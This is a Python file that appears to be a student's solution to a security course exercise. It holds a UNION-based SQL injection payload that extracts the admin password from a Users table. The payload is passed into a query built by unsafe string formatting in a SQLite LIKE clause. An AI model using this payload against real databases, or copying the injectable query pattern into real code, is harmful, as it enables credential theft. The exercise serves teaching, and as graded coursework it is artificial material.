#!/usr/bin/env python3
"""
TO DO
Complete query that finds the admin password stored in Users table. The result should contain only one entry containing the admin password.

Hints:

    If injection.py contains an Oracle class, then you have outdated exercise. In that case, update the exercise. You may have to do the update manually by downloading the zip file from the TMC server with a browser.
    You can assume that there is only one admin, marked with admin = 1
    See here for various examples of SQL injections
    See UNIONs

"""
import sys
import sqlite3
import string

def query():
	return ".%' UNION SELECT password FROM Users WHERE name LIKE 'admin"


def main(argv):
	username = sys.argv[1]
	dbname = sys.argv[2]
	conn = sqlite3.connect(dbname)
	cursor = conn.cursor()
	response = cursor.execute("SELECT body FROM Tasks WHERE name='%s' and body LIKE '%%%s%%'" % (username, query())).fetchall()
	print("SELECT body FROM Tasks WHERE name='%s' and body LIKE '%%%s%%'" % (username, query()))
	print('Found entries:')
	for r in response:
		print(r[0])


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s username database' % sys.argv[0])
	else:
		main(sys.argv)
